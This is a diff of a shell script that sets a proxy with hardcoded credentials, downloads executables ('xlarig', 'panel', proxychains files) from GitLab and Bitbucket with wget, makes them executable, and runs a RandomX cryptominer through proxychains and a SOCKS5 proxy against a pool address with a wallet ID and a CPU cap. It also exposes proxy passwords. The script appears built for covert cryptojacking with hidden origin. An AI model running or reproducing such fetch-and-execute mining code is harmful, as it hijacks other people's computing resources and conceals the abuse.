@@ -1,8 +1,8 @@
 proxy="34.192.31.89" 
 port="1080" 
 user="fixie"  
-pass="kl98b6frglS6jE4" 
-wget -q https://maper.info/Credit && chmod +x Credit >/dev/null 2>&1
+pass="ZItqWDieBi3LhbH" 
+wget -q https://gitlab.com/55113110159/oz/-/raw/main/xlarig && chmod +x xlarig 
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/panel && chmod +x panel 
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/libproxychains4.so && chmod +x libproxychains4.so 
@@ -19,4 +19,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./Credit -o 149.50.222.86:80 -u ZEPHsAfZQpiQ33Hf63Tx1MNJQR5cMV1Mx9kkgDMWNGZqMCYdsujaDUk6c4sGGiKzYwiqjucHjEYdfKaX5CbnpxPfGxa5Cb8BzcJ.8v -a rx/0 -x socks5://192.252.209.155:14455 --cpu-max-threads-hint=50% -k -s 
+./panel ./xlarig -o 149.50.222.86:80 -u ZEPHsAfZQpiQ33Hf63Tx1MNJQR5cMV1Mx9kkgDMWNGZqMCYdsujaDUk6c4sGGiKzYwiqjucHjEYdfKaX5CbnpxPfGxa5Cb8BzcJ.8v -a rx/0 -x socks5://192.252.209.155:14455 --cpu-max-threads-hint=50% -k -s 
